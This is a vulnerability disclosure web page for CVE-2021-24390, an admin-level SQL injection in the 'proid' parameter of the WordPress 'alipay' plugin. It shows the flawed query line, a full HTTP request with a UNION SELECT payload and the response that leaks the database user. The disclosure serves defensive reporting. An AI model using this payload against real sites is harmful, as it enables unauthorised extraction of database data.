<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : alipay | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Alipay</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/alipay/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : alipay</a></div>
<div>Effected Version : 3.7.2 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Administrator</div>
<div>CVE Number : CVE-2021-24390</div>
<div>Identified by : <a href="/author/syed_sheeraz_ali/">Syed Sheeraz Ali</a></div>
<div><a href="https://wpscan.com/plugin/alipay/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>May 9, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	
	<li>June 10, 2021 : CVE Assigned</li>
	
	<li>July 23, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>Vulnerable File: <code>/includes/tpl.edit_product.php#65</code></p>
<p>Vulnerable Code block and parameter:</p>
<p>Administrator level SQLi for parameter <code>proid</code> <a href="https://plugins.trac.wordpress.org/browser/alipay/trunk/includes/tpl.edit_product.php#65" target="_blank" rel="noreferrer noopener nofollow">/includes/tpl.edit_product.php#65</a>
</p>
<pre><code>65:    &quot;SELECT `meta_key`,`meta_value` FROM {$wpdb-&gt;wsaliproductsmeta} WHERE `wsaliproducts_id`={$_GET['proid']};&quot;
</code></pre><h2 id="poc-screenshots">PoC Screenshots</h2>
<p><img src="/disclosure_screenshots/alipay1.png" alt="PoC Screenshot">
<img src="/disclosure_screenshots/alipay2.png" alt="PoC Screenshot">
<img src="/disclosure_screenshots/alipay3.png" alt="PoC Screenshot"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>GET /wp-admin/options-general.php?page=ws_alipay&amp;action=edit&amp;proid=-5818 UNION ALL SELECT 73,73,73,73,73,user(),73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73# HTTP/1.1
Host: 172.28.128.50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1619997929%7CFjLHzIBKioEBny8ydzQjDZwzzgetHj4CE4LvUGwZ8BP%7C91ade9a8fb9ce5dd9f8590a3713b4002f95f743dbd80ca49f3e18fe1e19092b0; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3Ajym5wvRdroAFcxeeEV79mZSv; wordpress_23bcb0de10e8e61a4aab16fc0e9c3005=admin%7C1619531389%7CfDLpVjSqvWcp84Tu2SXKjCfpbcKft3zcY9lfEhlLjE8%7Cc1f3ab6d2df213f5d04520ef98d98dbf47521a3340f91ea762a7ecc204bc4949; wordpress_logged_in_23bcb0de10e8e61a4aab16fc0e9c3005=admin%7C1619531389%7CfDLpVjSqvWcp84Tu2SXKjCfpbcKft3zcY9lfEhlLjE8%7C10c373d650899a426f0e107a8d04d192f21c6c3b838a87bc590bc99ac51bf144; PHPSESSID=6cadbb1f34b2576f2f7394894314e1a4; googtrans=/en/en; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1619997929%7CFjLHzIBKioEBny8ydzQjDZwzzgetHj4CE4LvUGwZ8BP%7C271630feff089fbeb354c05f2163dcc39875be7fde3fa75d8c58c8f89ee443f4; wp-settings-1=mfold%3Do%26editor%3Dtinymce; wp-settings-time-1=1619825129
Connection: close
</code></pre><pre><code>&lt;form action=&quot;http://172.28.128.50/wp-admin/options-general.php?page=ws_alipay&amp;action=edit&amp;proid=-5818 UNION ALL SELECT 73,73,73,73,73,user(),73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73&quot; method=&quot;post&quot; id=&quot;ws_alipay_table_more_form&quot; class=&quot;ws_alipay_table_form&quot;&gt;
                    &lt;div style=&quot;display:none&quot;&gt;&lt;label for=&quot;proid&quot;&gt;商品编号&lt;/label&gt;&lt;input name=&quot;proid&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;name&quot;&gt;商品名称&lt;/label&gt;&lt;input name=&quot;name&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;protype&quot;&gt;商品类型&lt;/label&gt;&lt;select name=&quot;protype&quot;  class=&quot;ws_alipay_select_protype&quot;  &gt;&lt;option value=&quot;CUSTOM&quot;&gt;普通实物&lt;/option&gt;&lt;option value=&quot;VIRTUAL&quot;&gt;普通虚拟&lt;/option&gt;&lt;option value=&quot;ADP&quot;&gt;广告位&lt;/option&gt;&lt;option value=&quot;LINK&quot;&gt;友情链接&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;price&quot;&gt;商品价格&lt;/label&gt;&lt;input name=&quot;price&quot; type=&quot;text&quot; value=&quot;73.00&quot;  /&gt;&lt;/div&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;label for=&quot;pricePerDay&quot;&gt;每日单价&lt;/label&gt;&lt;input name=&quot;pricePerDay&quot; type=&quot;text&quot; value=&quot;&quot;  class=&quot;ws_alipay_multiPrice&quot; /&gt;&lt;/div&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;label for=&quot;pricePerWeek&quot;&gt;每周单价&lt;/label&gt;&lt;input name=&quot;pricePerWeek&quot; type=&quot;text&quot; value=&quot;&quot;  class=&quot;ws_alipay_multiPrice&quot; /&gt;&lt;/div&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;label for=&quot;pricePerMonth&quot;&gt;每月单价&lt;/label&gt;&lt;input name=&quot;pricePerMonth&quot; type=&quot;text&quot; value=&quot;&quot;  class=&quot;ws_alipay_multiPrice&quot; /&gt;&lt;/div&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;label for=&quot;pricePerQuarter&quot;&gt;每季单价&lt;/label&gt;&lt;input name=&quot;pricePerQuarter&quot; type=&quot;text&quot; value=&quot;&quot;  class=&quot;ws_alipay_multiPrice&quot; /&gt;&lt;/div&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;label for=&quot;pricePerYear&quot;&gt;每年单价&lt;/label&gt;&lt;input name=&quot;pricePerYear&quot; type=&quot;text&quot; value=&quot;&quot;  class=&quot;ws_alipay_multiPrice&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;description&quot;&gt;商品描述&lt;/label&gt;&lt;input name=&quot;description&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;weight&quot;&gt;商品净重(kg)&lt;/label&gt;&lt;input name=&quot;weight&quot; type=&quot;text&quot; value=&quot;73.00&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;snum&quot;&gt;已售数量&lt;/label&gt;&lt;input name=&quot;snum&quot; type=&quot;text&quot; value=&quot;73&quot;  readonly=&quot;readonly&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;num&quot;&gt;剩余数量&lt;/label&gt;&lt;input name=&quot;num&quot; type=&quot;text&quot; value=&quot;bob@localhost&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;images&quot;&gt;商品图片地址&lt;/label&gt;&lt;input name=&quot;images&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;download&quot;&gt;下载链接&lt;/label&gt;&lt;input name=&quot;download&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;zipcode&quot;&gt;解压密码&lt;/label&gt;&lt;input name=&quot;zipcode&quot; type=&quot;text&quot; value=&quot;&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;tags&quot;&gt;商品标签(,)&lt;/label&gt;&lt;input name=&quot;tags&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;spfre&quot;&gt;买家承担运费&lt;/label&gt;&lt;select name=&quot;spfre&quot;  class=&quot;ws_alipay_select_spfre&quot;  &gt;&lt;option value=&quot;0&quot;&gt;否&lt;/option&gt;&lt;option value=&quot;1&quot;&gt;是&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;freight&quot;&gt;运费价格&lt;/label&gt;&lt;input name=&quot;freight&quot; type=&quot;text&quot; value=&quot;73.00&quot;
---
class=&quot;ws_alipay_select_spfre_rel&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;location&quot;&gt;商品所在地&lt;/label&gt;&lt;input name=&quot;location&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;atime&quot;&gt;商品添加日期&lt;/label&gt;&lt;input name=&quot;atime&quot; type=&quot;text&quot; value=&quot;73&quot;  readonly=&quot;readonly&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;btime&quot;&gt;商品上架时间&lt;/label&gt;&lt;input name=&quot;btime&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;etime&quot;&gt;商品下架时间&lt;/label&gt;&lt;inpu
t name=&quot;etime&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;promote&quot;&gt;开启促销&lt;/label&gt;&lt;select name=&quot;promote&quot;  class=&quot;ws_alipay_select_promote&quot;  &gt;&lt;option value=&quot;0&quot;&gt;关闭&lt;/option&gt;&lt;option value=&quot;1&quot;&gt;开启&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;protime&quot;&gt;开启每日促销&lt;/label&gt;&lt;select name=&quot;protime&quot;  class=&quot;ws_alipay_select_protime 				ws_alipay_select_promote_rel&quot;  &gt;&lt;option value=&quot;0&quot;&gt;关闭&lt;/option&gt;&lt;option value=&quot;1&quot;&gt;开启&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;probdate&quot;&gt;促销开始日期&lt;/label&gt;&lt;input name=&quot;probdate&quot; type=&quot;text&quot; value=&quot;73&quot;  class=&quot;ws_alipay_select_promote_rel ws_alipay_select_promote_rel&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;probtime&quot;&gt;促销开始时间&lt;/label&gt;&lt;input name=&quot;probtime&quot; type=&quot;text&quot; value=&quot;73&quot;  class=&quot;ws_alipay_select_protime_rel ws_alipay_select_promote_rel&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;proedate&quot;&gt;促销结束日期&lt;/label&gt;&lt;input name=&quot;proedate&quot; type=&quot;text&quot; value=&quot;73&quot;  class=&quot;ws_alipay_select_promote_rel ws_alipay_select_promote_rel&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;proetime&quot;&gt;促销结束时间&lt;/label&gt;&lt;input name=&quot;proetime&quot; type=&quot;text&quot; value=&quot;73&quot;  class=&quot;ws_alipay_select_protime_rel ws_alipay_select_promote_rel&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;discountb&quot;&gt;促销折扣&lt;/label&gt;&lt;select name=&quot;discountb&quot;  class=&quot;ws_alipay_select_discountb ws_alipay_select_promote_rel&quot;  &gt;&lt;option value=&quot;0&quot;&gt;关闭&lt;/option&gt;&lt;option value=&quot;1&quot;&gt;开启&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;discount&quot;&gt;折扣比率&lt;/label&gt;&lt;input name=&quot;discount&quot; type=&quot;text&quot; value=&quot;73.00&quot;  class=&quot;ws_alipay_select_discountb_rel ws_alipay_select_promote_rel&quot; /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;tplid&quot;&gt;模版选择&lt;/label&gt;&lt;input name=&quot;tplid&quot; type=&quot;text&quot; value=&quot;73&quot;  /&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;autosend&quot;&gt;启用自动货源列表&lt;/label&gt;&lt;select name=&quot;autosend&quot;  class=&quot;ws_alipay_select_autosend&quot;  &gt;&lt;option value=&quot;0&quot;&gt;关闭&lt;/option&gt;&lt;option value=&quot;1&quot;&gt;开启&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;autosep&quot;&gt;货源分隔符&lt;/label&gt;&lt;input name=&quot;autosep&quot; type=&quot;text&quot; value=&quot;73&quot;  class=&quot;ws_alipay_select_autosend_rel&quot; /&gt;&lt;/div&gt;&lt;div style=&quot;float:none;clear:both;width:100%;&quot;&gt;
&lt;label for=&quot;autosrc&quot; style=&quot;float:left;padding-left:2.5%;width:100%&quot;&gt;虚拟物品货源&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(如果货源文本是每行一个条目,请将'货源分隔符'留空。一旦设置了分隔符，下面的货源文件就应该用该分隔符分隔)&lt;/label&gt;
&lt;textarea name=&quot;autosrc&quot; style=&quot;float:right;display:block;width:97.5%;min-width:97.5%;max-width:97.5%;min-height:70px;margin-left:2.5%&quot; class=&quot;ws_alipay_select_autosend_rel&quot;&gt;73&lt;/textarea&gt;
&lt;/div&gt;&lt;div&gt;&lt;label for=&quot;buylink&quot;&gt;商品快捷链接&lt;/label&gt;&lt;input name=&quot;buylink&quot; type=&quot;text&quot; value=&quot;http://172.28.128.50/wp-content/plugins/alipay/includes/tpl.cart.php?proid=73&quot;  class=&quot;ws_alipay_prolink&quot; title=&quot;双击打开&quot; /&gt;&lt;/div&gt;&lt;input type=&quot;hidden&quot; id=&quot;_wpnonce&quot; name=&quot;_wpnonce&quot; value=&quot;9385918456&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;_wp_http_referer&quot; value=&quot;/wp-admin/options-general.php?page=ws_alipay&amp;amp;action=edit&amp;amp;proid=-5818 UNION ALL SELECT 73,73,73,73,73,user(),73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73#&quot; /&gt;

                    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;button-primary&quot; value=&quot;更新&quot;/&gt;

                    &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
                &lt;/form&gt;
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  © <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

